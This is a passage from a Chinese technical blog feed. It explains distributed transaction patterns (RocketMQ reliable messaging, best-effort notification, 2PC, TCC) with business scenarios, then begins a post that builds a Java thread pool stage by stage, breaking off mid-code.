title="分布式事务解决方案—可靠消息最终一致性"></a><strong>分布式事务解决方案—可靠消息最终一致性</strong></h3><p>也算是Base理论的实现<br /><strong>可靠消息：张三给李四发钱，张三的账户先减少钱，然后发送一条消息到消息队列，李四进行接收消息增加钱，保证整个过程的可靠性。</strong><br /><strong>最终一致性：张三发钱后，是不能再回滚的，李四就必须获取并消费消息，保证的最终数据是一致的。</strong></p><blockquote><p>这中间有什么问题？</p></blockquote><p>张三向消息队列发送消息就一定会出现网络问题，比如：事务内，张三钱减少了，然后发送数据到消息队列，如果发送错误张三的钱也可以回滚，但是可能消息已经到队列了，但返回时网络延迟发生错误，导致数据回滚，则队列中数据是仍然存在的，所以一定要保证数据操作与消息发送保证<code>原子性</code>。<br />李四需要必须接收并完成消息，但可能出现问题导致不断的重试，所以有<code>幂等性</code>的问题<br><a name="CQSMK"></a></p><h4 id="RocketMq"><a href="#RocketMq" class="headerlink" title="RocketMq"></a><a href="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage">RocketMq</a></h4><p><img src="https://cdn.nlark.com/yuque/__puml/902be8e09356fbdc3c045fb7e973d5a7.svg#lake_card_v2=eyJ0eXBlIjoicHVtbCIsImNvZGUiOiJAc3RhcnR1bWxcblxuYXV0b251bWJlclxuXG7lvKDkuIkgLT4gcm9ja2V0TXE6IOaIkeimgee7meadjuWbm-WPkTEw5Z2X6ZKxXG5yb2NrZXRNcSAtPiDlvKDkuIk6IOW3sue7j-aIkOWKn-WtmOWFpemYn-WIlyzkvYbmtojmga_kuI3lj6_ooqvmtojotLlcbuW8oOS4iSAtPiDlvKDkuIk6IOW8gOWQr-acrOWcsOS6i-WKoSzlh4_ljrsxMOWdl-mSsSzlkYror4nmtojmga_pmJ_liJfvvIzmnKzlnLDkuovliqHmiJDlip9cbnJvY2tldE1xIC0-IHJvY2tldE1xOuWwhuivpeS6i-WKoea2iOaBr-WPr-iiq-a2iOi0uVxu5p2O5ZubIC0-IHJvY2tldE1xOiDojrflj5bkuovliqHmtojmga9cbuadjuWbmyAtPiDmnY7lm5s6IOW8gOWQr-acrOWcsOS6i-WKoe-8jOWinuWKoDEw5Z2X6ZKx77yM5bm2YWNr6K-l5LqL5Yqh5raI5oGvXG5cbkBlbmR1bWwiLCJ1cmwiOiJodHRwczovL2Nkbi5ubGFyay5jb20veXVxdWUvX19wdW1sLzkwMmJlOGUwOTM1NmZiZGMzYzA0NWZiN2U5NzNkNWE3LnN2ZyIsImlkIjoiR25Ib1MiLCJtYXJnaW4iOnsidG9wIjp0cnVlLCJib3R0b20iOnRydWV9LCJjYXJkIjoiZGlhZ3JhbSJ9">这是大概的一个流程，我们现在分析可能存在哪些问题：<br />张三向消息队列成功发送事务消息后,有一个rockmq监听本地事务方法的返回。这时候事务消息并不能被消费，如果张三正常提交本地事务，则该事务消息可被消费，如果本地事务没有提交成功，返回Rollback则事务消息删除，如果返回UnKnown(比如出现某些异常)，则过一段时间，消息队列会再次监听本地事务执行情况。从而保证张三本地事务与事务消息的原子性。<br />李四从消息队列获取消息后，应该进行本地事务并确认该事务消息，如果没有确认，消息队列会不断发给消费者，最终也可人工处理。<br />可靠消息最终一致性的优点就是如果李四那边要执行很久，张三这边是不用等的，只要最终确认该事务消息即可。进行了异步解耦。<br><a name="NYbFr"></a></p><h3 id="分布式事务解决方案—最大努力通知"><a href="#分布式事务解决方案—最大努力通知" class="headerlink" title="分布式事务解决方案—最大努力通知"></a>分布式事务解决方案—最大努力通知</h3><p><a name="wrMQP"></a></p><h4 id="RocketMq-1"><a href="#RocketMq-1" class="headerlink" title="RocketMq"></a><a href="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage">RocketMq</a></h4><p>我们以支付业务为例<br><img src="https://cdn.nlark.com/yuque/__puml/b369443b3c0967be0f4a586a09b66ca3.svg#lake_card_v2=eyJ0eXBlIjoicHVtbCIsImNvZGUiOiJAc3RhcnR1bWxcblxuYXV0b251bWJlclxu6LSm5oi357O757ufIC0-IOWFheWAvOezu-e7nyA6IOaUr-S7mOivt-axglxu5YWF5YC857O757ufIC0-IOWFheWAvOezu-e7nyA6IOWujOaIkOaUr-S7mOWkhOeQhlxu5YWF5YC857O757ufIC0-IOi0puaIt-ezu-e7nyA6IOWFheWAvOe7k-aenOmAmuefpVxu6LSm5oi357O757ufIC0-IOi0puaIt-ezu-e7nyA6IOabtOaWsOWFheWAvOeKtuaAge-8mlwi5oiQ5YqfL-Wksei0pVwiXG7otKbmiLfns7vnu58gLT4g5YWF5YC857O757ufIDog5raI5oGv5qCh5a-5LOS4u-WKqOivt-axguafpeivoue7k-aenFxuQGVuZHVtbCIsInVybCI6Imh0dHBzOi8vY2RuLm5sYXJrLmNvbS95dXF1ZS9fX3B1bWwvYjM2OTQ0M2IzYzA5NjdiZTBmNGE1ODZhMDliNjZjYTMuc3ZnIiwiaWQiOiJvNkV3SSIsIm1hcmdpbiI6eyJ0b3AiOnRydWUsImJvdHRvbSI6dHJ1ZX0sImNhcmQiOiJkaWFncmFtIn0=">这里的账户系统就是等待通知的<br />充值系统当充值完毕后发起通知</p><blockquote><p>这里我们看出最大努力通知的目标：发起通知方通过一定的机制最大努力将业务处理结果通知到接收方。</p></blockquote><p>具体包括：</p><ol><li><p>有一定的消息重复通知机制</p><ol><li>因为接收通知方可能没有接收到通知，此时要有一定的机制对消息重复通知</li></ol></li><li><p>消息校验机制</p><ol><li>如果尽最大努力也没有通知到接收方，或者接收方消费消息后要再次消费，此时可由接收方主动向通知方查询信息来满足需求。<blockquote><p>最大努力通知与可靠消息一致性有什么不同？</p></blockquote></li></ol></li><li><p>解决思想不同</p></li></ol><p>可靠消息一致性主要保证消息发送方保证把消息发送出去，并消息接收方成功获取并消费该消息，关键在发起方。<br />最大努力通知则侧重消息能被消息接受者收到，或者可以消息接收方主动来查询消息状态，关键在于接收方。</p><ol start="2"><li>业务应用场景不同</li></ol><p>可靠消息一致性关注的是交易过程的事务一致，以异步的方式完成交易。 <br />最大努力通知关注的是交易后的通知事务，即将交易结果可靠的通知出去。</p><ol start="3"><li>技术解决方向不同</li></ol><p>可靠消息一致性要解决消息从发出到接收的一致性，即消息发出并且被接收到。<br />最大努力通知无法保证消息从发出到接收的一致性，只提供消息接收的可靠性机制。可靠机制是，最大努力的将消 息通知给接收方，当消息无法被接收方接收时，由接收方主动查询消息（业务处理结果）。</p><p><a name="RmZfj"></a></p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>消息接收方直接监听消息队列<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668775974549-0c4533b5-48eb-46ec-b97e-e92b86f43e7a.png#averageHue=%23e08f59&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=178&id=u94d6a4bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=267&originWidth=1105&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59245&status=done&style=none&taskId=u273b3e30-6a3e-4005-8d38-88b9e1921a6&title=&width=736.6666666666666" alt="image.png"><br />由消息通知系统监听消息队列，然后再通知消息接收方<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668776030848-59bf2b3e-5633-4d65-837c-0f37870ca081.png#averageHue=%23fdf5e4&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=324&id=uaac49165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=486&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138121&status=done&style=none&taskId=uc92a40d9-2111-477a-ab97-dfd73d459b2&title=&width=747.3333333333334" alt="image.png"></p><blockquote><p>这两者有啥不同？</p></blockquote><p>第一种只适用于内部网络系统，也就是发起方和接收方都归你管理。但如果说消息发送方是第三方系统，人家就不能让你监听人家的消息队列吧，只能说加入一个中间通知系统，然后通过网络请求来通知你。</p><p><a name="VCrLJ"></a></p><h3 id="分布式事务综合案例分析"><a href="#分布式事务综合案例分析" class="headerlink" title="分布式事务综合案例分析"></a>分布式事务综合案例分析</h3><p>在上面我们已经学习了四种不同的分布式事务解决方案，我们需要进行区分，哪种业务场景需要哪种实现，各个方案有什么区别。<br><a name="qXtwu"></a></p><h4 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668776391869-a361a07b-afda-451e-8968-be319e055d87.png#averageHue=%23fefefe&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=352&id=u11e98d82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=528&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105672&status=done&style=none&taskId=ub75e8e9c-27fc-4f85-a9a7-d2d45e0a767&title=&width=740" alt="image.png">    用户向用户中心发起注册请求，用户中心保存用户业务信息，然后通知统一账号服务新建该用户所对应登录账号。<br />针对注册业务，如果用户与账号信息不一致，则会导致严重问题，因此该业务对<strong>一致性要求较为严格</strong>，即当用户服务和账号服务任意一方出现问题都需要<strong>回滚事务</strong>。</p><blockquote><p>业务分析</p></blockquote><ol><li><p>使用最大努力通知</p><ol><li>不可以，用户服务注册好后，通知账户服务，这里只能说不断通知，没法做到回滚</li></ol></li><li><p>使用可靠消息一致性</p><ol><li>不可以，用户发送事务消息，然后进行本地事务，如果成功了，也无法保证账户服务成功消费，无法回滚</li></ol></li><li><p>TCC方案</p><ol><li>可行，支持事务回滚，性能好，但实现复杂</li></ol></li><li><p>2PC方案</p><ol><li>可行，支持事务回滚，有性能损耗，但简单<br><a name="TURmk"></a><h4 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h4><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668776817369-23ca6d64-cfb0-44ff-bb1e-72927bc45571.png#averageHue=%23fefefe&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=u0b4a2472&margin=%5Bobject%20Object%5D&name=image.png&originHeight=683&originWidth=1072&originalType=binary&ratio=1&rotation=0&showTitle=false&size=203986&status=done&style=none&taskId=u6cc2e00d-c411-4359-9d16-ccf3dd403c0&title=&width=612.5714285714286" alt="image.png"><br />用户向用户中心提交开户资料，用户中心生成开户请求号并重定向至银行存管系统开户页面。用户设置存管密码并确认开户后，银行存管立即返回“请求已受理”。在某一时刻，银行存管系统处理完该开户请求后，将调用回调地址通知处理结果，若通知失败，则按一定策略重试通知。同时，银行存管系统应提供开户结果查询的接口，供用户中心校对结果。<blockquote><p>业务分析</p></blockquote></li></ol></li><li><p>Seata方案</p><ol><li>不可行，银行存管系统不能让你去编写业务代码吧</li></ol></li><li><p>TCC方案</p><ol><li>不可行，银行存管系统不会让你写try，conform，console吧</li></ol></li><li><p>可靠消息最终一致性</p><ol><li>不可行，银行系统不会和用户系统直接通过MQ交互</li></ol></li><li><p>最大努力通知</p><ol><li>可行，我们发送请求给银行系统，银行系统最终给我返回结果，或者我们也可主动查询<br><a name="gnVFt"></a><h4 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h4><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668777226518-fd4d22e4-14d7-460c-96e6-e198543b9670.png#averageHue=%23fefefe&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=298&id=ud25f72f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=522&originWidth=1117&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98059&status=done&style=none&taskId=uc42067de-7131-465f-b6b5-b8e019bb1ff&title=&width=638.2857142857143" alt="image.png"><br />管理员对某标的满标审批通过，交易中心修改标的状态为“还款中”，同时要通知还款服务生成还款计划。<blockquote><p>业务分析</p></blockquote></li></ol></li><li><p>使用Seata</p><ol><li>不行，生成计划如果过久，Seata锁定资源</li></ol></li><li><p>使用TCC</p><ol><li>本需求对业务一致性要求较低，因为生成还款计划的时长较长，所以不要求交易中心修改标的状态为“还款中”就立 即生成还款计划  ，所以本方案不适用。</li></ol></li><li><p>使用努力通知</p><ol><li>满标审批通过后由交易中心向还款服务发送通知要求生成还款计划，还款服务并且对外提供还款计划生成结果校对接口供其它服务查询，最大努力  通知方案也适用本场景  。</li></ol></li><li><p>使用消息一致性</p><ol><li>满标审批通过后由交易中心修改标的状态为“还款中”并且向还款服务发送消息，还款服务接收到消息开始生成还款计划，基本于MQ的可靠消息一致性方案适用此场景  。</li></ol></li></ol><p><a name="WqaJQ"></a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>分布式事务对比分析</strong>:<br /><strong>2PC</strong> 最大的诟病是一个阻塞协议。RM在执行分支事务后需要等待TM的决定，此时服务会阻塞并锁定资源。由于其 阻塞机制和最差时间复杂度高， 因此，这种设计不能适应随着事务涉及的服务数量增加而扩展的需要，很难用于并 发较高以及子事务生命周期较长 (long-running transactions) 的分布式服务中。</p><p>如果拿<strong>TCC</strong>事务的处理流程与2PC两阶段提交做比较，2PC通常都是在跨库的DB层面，而TCC则在应用层面的处 理，需要通过业务逻辑来实现。这种分布式事务的实现方式的优势在于，可以让应用自己定义数据操作的粒度，使 得降低锁冲突、提高吞吐量成为可能。而不足之处则在于对应用的侵入性非常强，业务逻辑的每个分支都需要实现 try、conﬁrm、cancel三个操作。此外，其实现难度也比较大，需要按照网络状态、系统故障等不同的失败原因实 现不同的回滚策略。典型的使用场景：满，登录送优惠券等。</p><p><strong>可靠消息最终一致性</strong>事务适合执行周期长且实时性要求不高的场景。引入消息机制后，同步的事务操作变为基于消 息执行的异步操作, 避免了分布式事务中的同步阻塞操作的影响，并实现了两个服务的解耦。典型的使用场景：注 册送积分，登录送优惠券等。</p><p><strong>最大努力通知</strong>是分布式事务中要求最低的一种,适用于一些最终一致性时间敏感度低的业务；允许发起通知方处理业 务失败，在接收通知方收到通知后积极进行失败处理，无论发起通知方如何处理结果都会不影响到接收通知方的后 续处理；发起通知方需提供查询执行情况接口，用于接收通知方校对结果。典型的使用场景：银行通知、支付结果 通知等。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668777549912-92699695-0169-46d4-8e10-f98736ba4973.png#averageHue=%23f4f4f4&clientId=ua82a1930-fed4-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=138&id=uc9fd90a1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=1051&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30754&status=done&style=none&taskId=ub4635056-a096-4583-9c40-b3e376ed48b&title=&width=600.5714285714286" alt="image.png"><br /><strong>总结</strong>：<br />在条件允许的情况下，我们尽可能选择本地事务单数据源，因为它减少了网络交互带来的性能损耗，且避免了数据 弱一致性带来的种种问题。若某系统频繁且不合理的使用分布式事务，应首先从整体设计角度观察服务的拆分是否 合理，是否高内聚低耦合？是否粒度太小？分布式事务一直是业界难题，因为网络的不确定性，而且我们习惯于拿 分布式事务与单机事务ACID做对比。无论是数据库层的XA、还是应用层TCC、可靠消息、最大努力通知等方案，都没有完美解决分布式事务问题，它们 不过是各自在性能、一致性、可用性等方面做取舍，寻求某些场景偏好下的权衡。总结：在条件允许的情况下，我们尽可能选择本地事务单数据源，因为它减少了网络交互带来的性能损耗，且避免了数据 弱一致性带来的种种问题。若某系统频繁且不合理的使用分布式事务，应首先从整体设计角度观察服务的拆分是否 合理，是否高内聚低耦合？是否粒度太小？分布式事务一直是业界难题，因为网络的不确定性，而且我们习惯于拿 分布式事务与单机事务ACID做对比。<br />无论是数据库层的XA、还是应用层TCC、可靠消息、最大努力通知等方案，都没有完美解决分布式事务问题，它们不过是各自在性能、一致性、可用性等方面做取舍，寻求某些场景偏好下的权衡。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 事务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手写线程池</title>
      <link href="/2022/11/25/%E5%B9%B6%E5%8F%91/%E6%89%8B%E5%86%99%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2022/11/25/%E5%B9%B6%E5%8F%91/%E6%89%8B%E5%86%99%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="手写线程池"><a href="#手写线程池" class="headerlink" title="手写线程池"></a>手写线程池</h1><blockquote><p>​    我们从初级阶段自己创建线程去异步执行任务，到后期使用线程池不断执行任务，原理书上都有，但都是字面意思，无法深入理解，所以打算自己进行实现。</p></blockquote><ol><li>阶段一：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                log.info(<span class="string">&quot;异步任务执行。。。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br></pre></td></tr></table></figure><ol start="2"><li>阶段二:</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抽离出一个统一接口，具体实现由子类完成</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义各自的子类去实现execute方法</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myExecutor</span> <span class="keyword">implements</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">        <span class="comment">// 底层还是执行的 new Thread(r)，虽然现在看起来是有点儿麻烦，但更方便我们进行扩展了</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(r).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>阶段三：上面我们执行一次方法就创建一个线程，先不说会不会OOM，就线程的创建与销毁都够损耗性能的。我们能不能只使用一个异步线程，但是执行多个任务呢?</li></ol><blockquote><p>这里我之前有一个小疑惑，一般任务都是在<code>new Thead(这里就指定好需要完成的任务).start()</code>，那假如这个线程执行完了后，我还能不能再指定一个新的任务，让它再启动，后来发现不行，执行完的线程就已经挂了，不能再进行复用，那大家平时说的线程复用是啥意思呢？ 所以转化一些思路，是线程一直在运行，在这期间不断读取一个任务表，第一个任务完成后，马上干第二个任务。以此类推，让一个线程完成多个任务。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抽离出一个统一接口，具体实现由子类完成</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myExecutor</span> <span class="keyword">implements</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个阻塞任务队列</span></span><br><span class="line">    <span class="keyword">static</span> BlockingDeque&lt;Runnable&gt; task = <span class="keyword">new</span> <span class="title class_">LinkedBlockingDeque</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// 使用一个线程不断从任务队列中读取数据，然后执行，达到复用的效果</span></span><br><span class="line">        log.info(<span class="string">&quot;异步线程开始不断读取任务。。。&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 因为无限循环，所以线程会一致运行，后期我们会再升级，让它优雅的结束</span></span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="comment">// take方法是阻塞方法，当队列中无任务时，线程阻塞</span></span><br><span class="line">                    <span class="type">Runnable</span> <span class="variable">poll</span> <span class="operator">=</span> task.take();</span><br><span class="line">                    <span class="comment">// 当读取到任务时，就开始执行。</span></span><br><span class="line">                    poll.run();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">        <span class="comment">// 新来的任务直接添加到队列中</span></span><br><span class="line">        task.add(r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>阶段四：上面仍有许多潜在的问题</p><ol><li>其中一个任务报错且未处理，后面的任务别想执行了。</li><li>其中一个任务耗时过久，新来的任务迟迟不能处理，任务会不断挤压，造成OOM。</li><li>未利用多核CPU的优势</li></ol><p>那这里很简单，不是嫌少嘛，我多安排几个线程去不断监控任务队列，这里一定注意队列需要有锁保护，不能一个任务多个线程都处理一遍</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myExecutor</span> <span class="keyword">implements</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个阻塞任务队列</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> BlockingDeque&lt;Runnable&gt; task = <span class="keyword">new</span> <span class="title class_">LinkedBlockingDeque</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要指定多少个线程去执行</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> CORE_POOL_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">        <span class="comment">// 新来的任务直接添加到队列中</span></span><br><span class="line">        task.add(r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">myExecutor</span><span class="params">(<span class="type">int</span> corePoolSize)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.CORE_POOL_SIZE = corePoolSize;</span><br><span class="line">        init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化制定线程数去不断监控队列</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 使用一个线程不断从任务队列中读取数据，然后执行，达到复用的效果</span></span><br><span class="line">        log.info(<span class="string">&quot;异步线程开始不断读取任务。。。&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; THREAD_SIZE; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 因为无限循环，所以线程会一致运行</span></span><br><span class="line">                    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                        <span class="comment">// take方法是阻塞方法，当队列中无任务时，线程阻塞</span></span><br><span class="line">                        <span class="type">Runnable</span> <span class="variable">poll</span> <span class="operator">=</span> task.take();</span><br><span class="line">                        <span class="comment">// 当读取到任务时，就开始执行。</span></span><br><span class="line">                        poll.run();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><p>阶段五：上面有哪些问题呢？</p><ol><li>我们初始化时直接创建了<code>corePoolSize</code>个数量的线程，如果一直没任务不就浪费了嘛，还占内存，我们能不能指定<code>corePoolSize</code>后，暂时不创建线程，每次执行任务时，判断当前工作线程数，是否小于<code>corePoolSize</code>,如果小于，我就创建新的线程，否则我就不创建线程了。</li><li>传入RejectedExecutionHandler对象，任务队列不能无限放置吧，所以当我们判定任务队列已经满了的时候，就需要使用用户传来的RejectedExecutionHandler进行处理，也就是决定这些任务该怎么处理。</li><li>传入ThreadFactory对象，对线程进行统一的管理，如线程名，需要执行额外的逻辑，而不直接new Thread()。</li><li>线程自我摧毁装置，当一定时间内都没有获取到任务，就默认线程池不需要太多的线程了，则进行销毁</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myExecutor</span> <span class="keyword">implements</span> <span class="title class_">Executor</span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个阻塞任务队列</span></span><br><span class="line">    <span class="keyword">private</span> <span 